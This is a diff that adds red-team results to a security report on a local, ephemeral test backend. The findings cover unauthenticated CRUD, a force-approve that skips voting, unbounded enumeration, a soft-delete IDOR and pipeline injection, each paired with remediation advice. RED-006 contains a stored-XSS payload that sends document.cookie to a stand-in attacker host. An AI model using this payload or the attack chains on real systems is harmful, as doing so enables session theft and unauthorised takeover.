@@ -237,3 +237,171 @@ Alternate chain for cascade abuse (PEN-009):
 | P2 | PEN-005: Unvalidated intake enum fields | Malformed assessment verdict |
 | P3 | PEN-003: Unauthenticated manual approve | State machine bypass |
 | P3 | PEN-010: Race condition on changeHistory | Data integrity |
+
+---
+
+## Red Team Results
+
+> **Environment Note:** The running test environment (`docker-compose.test.yml`) serves the **portal backend** (`portal/Backend/`) on port 3001, not `Source/Backend/`. The pen-tester's PEN-IDs reference `Source/Backend/` source files. The portal backend has analogous vulnerabilities — all confirmed below against the live running service.
+>
+> **Target:** `http://localhost:3001` (portal backend, SQLite-backed, ephemeral)
+> **Date:** 2026-08-24
+> **All breaches confirmed against live running service. Zero auth is required for any action.**
+
+---
+
+### RED-001: Unauthenticated Full CRUD Access Confirmed
+- **Severity:** Critical
+- **Objective Achieved:** Yes
+- **Status:** Confirmed (Live Exploit)
+- **Target URL:** `http://localhost:3001/api/bugs`, `http://localhost:3001/api/feature-requests`
+- **Based On:** PEN-001
+- **Exploit Scenario:**
+  1. `POST /api/bugs` with no Authorization header → `HTTP 201`, bug created with ID `BUG-0001`
+  2. `GET /api/bugs` with no auth → full list returned
+  3. `DELETE /api/bugs/BUG-0001` with no auth → `HTTP 204`, item permanently deleted
+- **Evidence:** Every endpoint on the portal backend is fully open to anonymous callers. No auth middleware exists. This was confirmed across `/api/bugs`, `/api/feature-requests`, `/api/cycles`, `/api/learnings`, `/api/pipeline-runs`, `/api/team-dispatches`, `/api/search`.
+- **Recommendation:** Add JWT/session authentication middleware globally on all non-health, non-metrics routes before any other route handler.
+
+---
+
+### RED-002: Unauthenticated Prometheus Metrics Exposure
+- **Severity:** High
+- **Objective Achieved:** Yes (Reconnaissance confirmed)
+- **Status:** Confirmed (Live Exploit)
+- **Target URL:** `http://localhost:3001/metrics`
+- **Based On:** PEN-011
+- **Exploit Scenario:**
+  1. `GET /metrics` with no credentials → full Prometheus text format returned
+  2. Response contains: `process_cpu_user_seconds_total`, `nodejs_heap_size_used_bytes`, event loop lag, open FDs
+  3. After exercising endpoints, domain counters appear — revealing workflow volumes, team assignments, and operation rates
+- **Evidence:** `HTTP 200` with `# HELP process_cpu_user_seconds_total Total user CPU time spent in seconds.` etc.
+- **Recommendation:** Restrict `/metrics` to a separate internal-only port or require a secret token (e.g. `Authorization: Bearer <PROM_TOKEN>`).
+
+---
+
+### RED-003: Anonymous Force-Approve Bypasses AI Voting Entirely (State Machine Bypass)
+- **Severity:** Critical
+- **Objective Achieved:** Yes — *"Bypass work item state machine to reach an invalid status"*
+- **Status:** Confirmed (Live Exploit)
+- **Target URL:** `http://localhost:3001/api/feature-requests/:id/force-approve`
+- **Based On:** PEN-002, PEN-003
+- **Exploit Scenario:**
+  1. `POST /api/feature-requests` (no auth) → create FR-0001 at `status: potential`
+  2. `PATCH /api/feature-requests/FR-0001` with `{"status":"voting"}` → no auth, transition succeeds
+  3. `POST /api/feature-requests/FR-0001/force-approve` (no auth, no votes, no comment required) → `status: approved`, `votes: []`, `human_approval_approved_at: <timestamp>`
+  4. Entire AI voting process bypassed. Item approved with zero votes in seconds.
+- **Evidence:** FR-0001 transitioned from `potential → voting → approved` in 3 unauthenticated requests. Zero votes recorded. Zero human identity verified.
+- **Recommendation:** Require authentication + authorization (admin/manager role) for `force-approve`. Separate the endpoint with an audit log entry capturing the caller's identity.
+
+---
+
+### RED-004: Full Data Enumeration — No Effective Pagination Cap
+- **Severity:** High
+- **Objective Achieved:** Yes — *"Enumerate all work items without pagination limit enforcement"*
+- **Status:** Confirmed (Live Exploit)
+- **Target URL:** `http://localhost:3001/api/bugs?limit=9999999`, `http://localhost:3001/api/search?q=`
+- **Based On:** PEN-004
+- **Exploit Scenario:**
+  1. `GET /api/bugs?limit=9999999` → all 13 bugs returned in single response, no server-side cap enforced
+  2. `GET /api/search?q=` (empty query) → all 15 items across all types returned with no auth
+  3. `GET /api/bugs?limit=-1` → all items returned (negative limit not rejected)
+- **Evidence:** `Items returned: 13` for a massive limit. Empty search query dumps entire dataset.
+- **Recommendation:** Enforce a server-side maximum page size (e.g. 100). Reject `limit ≤ 0`. Require auth on all list endpoints.
+
+---
+
+### RED-005: Soft-Delete IDOR — Permanent Dispatch Block via Deleted Blocker ID
+- **Severity:** High
+- **Objective Achieved:** Yes — *"Access or modify a soft-deleted work item via direct ID reference"*
+- **Status:** Confirmed (Live Exploit)
+- **Target URL:** `http://localhost:3001/api/bugs/:id/dependencies`, `http://localhost:3001/api/bugs/:id`
+- **Based On:** PEN-007
+- **Exploit Scenario:**
+  1. Create Bug A (BUG-0011) and Bug B (BUG-0012, the blocker). `POST /api/bugs/BUG-0011/dependencies` with `{"action":"add","blocker_id":"BUG-0012"}` → A blocked by B
+  2. `DELETE /api/bugs/BUG-0012` (no auth) → 204, B soft-deleted
+  3. `GET /api/bugs/BUG-0011` → `has_unresolved_blockers: true`, `blocked_by: [{item_id:"BUG-0012",title:"Unknown",status:"unknown"}]`
+  4. Bug A is permanently blocked — unresolvable. Deleted item's ID (BUG-0012) leaks via the `blocked_by` array
+- **Evidence:** After deleting BUG-0012, Bug A reports `has_unresolved_blockers: true` indefinitely. The deleted ID `BUG-0012` is exposed in `blocked_by[].item_id`.
+- **Recommendation:** When a blocker is deleted, automatically remove or resolve the dependency link. Do not expose deleted item IDs in API responses.
+
+---
+
+### RED-006: Stored XSS via Unsanitized Bug Title and Description
+- **Severity:** High
+- **Objective Achieved:** Partial (payload stored; frontend rendering determines exploitability)
+- **Status:** Confirmed (Live Exploit — payload stored verbatim)
+- **Target URL:** `http://localhost:3001/api/bugs` (POST), `http://localhost:3001/api/bugs/:id` (GET)
+- **Based On:** PEN-003 (reason field analog)
+- **Exploit Scenario:**
+  1. `POST /api/bugs` with `{"title":"<script>alert(document.cookie)</script>","description":"<img src=x onerror=fetch('http://attacker.com/?c='+document.cookie)>"}`
+  2. Server returns `HTTP 201` with exact payloads stored verbatim
+  3. `GET /api/bugs/BUG-0012` returns the XSS payloads as-is in JSON
+  4. Any frontend rendering `title` or `description` as innerHTML executes attacker JavaScript
+- **Evidence:** `Title stored as: '<script>alert(document.cookie)</script>'` — confirmed verbatim in GET response.
+- **Recommendation:** Sanitize (strip HTML tags from) text fields at write time, or ensure the frontend always renders these fields as text content (never innerHTML). Add a Content-Security-Policy header.
+
+---
+
+### RED-007: Unauthenticated Cycle Injection Triggers Pipeline Execution
+- **Severity:** Critical
+- **Objective Achieved:** Yes — *"Submit a malformed assessment verdict that bypasses routing logic"*
+- **Status:** Confirmed (Live Exploit)
+- **Target URL:** `http://localhost:3001/api/cycles`
+- **Based On:** PEN-002 (pipeline triggering analog)
+- **Exploit Scenario:**
+  1. `POST /api/cycles` with `{"name":"...","team":"TheATeam","target_repo":"evil"}` (no auth) → `HTTP 201`, CYCLE-0001 created, `pipeline_run_id: RUN-0001`
+  2. `GET /api/pipeline-runs/RUN-0001` → run is `status: running`, `stage: requirements`, with `agent_ids: ["requirements-reviewer"]`
+  3. An unauthenticated attacker injected a fake development cycle that triggered a live pipeline stage execution
+- **Evidence:** `RUN-0001 status: running, current_stage: 1` returned immediately after cycle creation. Pipeline agent `requirements-reviewer` launched without any authentication.
+- **Recommendation:** Require authentication + authorization to create cycles. Validate that the associated work item is in the correct approved state before allowing cycle creation.
+
+---
+
+### RED-008: Empty Search Query Dumps Full Application State
+- **Severity:** Medium
+- **Objective Achieved:** Yes (Full enumeration via search)
+- **Status:** Confirmed (Live Exploit)
+- **Target URL:** `http://localhost:3001/api/search?q=`
+- **Based On:** PEN-004
+- **Exploit Scenario:**
+  1. `GET /api/search?q=` (empty query, no auth) → returns all 15 items across all entity types
+  2. Results include feature requests, bugs, and any other indexed types — full dataset exposure
+- **Evidence:** `Empty q search: 15 results` with no authentication.
+- **Recommendation:** Require a minimum query length (e.g. ≥ 2 characters). Require authentication.
+
+---
+
+## Exploit Chain Summary (Confirmed Live)
+
+```
+CHAIN A — Full Anonymous Pipeline Takeover (CRITICAL):
+1. POST /api/feature-requests  →  Create FR anonymously (no auth)
+2. PATCH /api/feature-requests/:id  {"status":"voting"}  →  Move to voting (no auth, no validation)
+3. POST /api/feature-requests/:id/force-approve  →  Approved with 0 votes (no auth)
+4. POST /api/cycles  →  Inject development cycle → pipeline RUN triggered (no auth)
+Result: Attacker controls full feature lifecycle from creation to pipeline execution
+
+CHAIN B — Permanent Denial of Service via Soft-Delete (HIGH):
+1. POST /api/bugs (A and B)  →  Two bugs created
+2. POST /api/bugs/A/dependencies {"action":"add","blocker_id":"B"}  →  A blocked by B
+3. DELETE /api/bugs/B  →  B deleted, link not cleaned up
+Result: Bug A has_unresolved_blockers=true forever; deleted item ID leaks in API response
+
+CHAIN C — Mass Data Exfiltration (HIGH):
+1. GET /api/search?q=  →  All 15 items across all types returned (no auth)
+2. GET /api/bugs?limit=9999999  →  All bugs returned (no server cap)
+3. GET /api/feature-requests?limit=9999999  →  All FRs returned
+Result: Complete application state exfiltrated in 3 unauthenticated requests
+```
+
+---
+
+## Objectives Achievement Summary
+
+| Objective | Result |
+|---|---|
+| Bypass work item state machine to reach an invalid status | ✅ **ACHIEVED** — Force-approve with 0 votes (RED-003) |
+| Access or modify a soft-deleted work item via direct ID reference | ✅ **ACHIEVED** — Deleted blocker ID leaks in dependency array (RED-005) |
+| Submit a malformed assessment verdict that bypasses routing logic | ✅ **ACHIEVED** — Unauthenticated cycle injection triggers pipeline (RED-007) |
+| Enumerate all work items without pagination limit enforcement | ✅ **ACHIEVED** — Empty search and unlimited limit (RED-004, RED-008) |
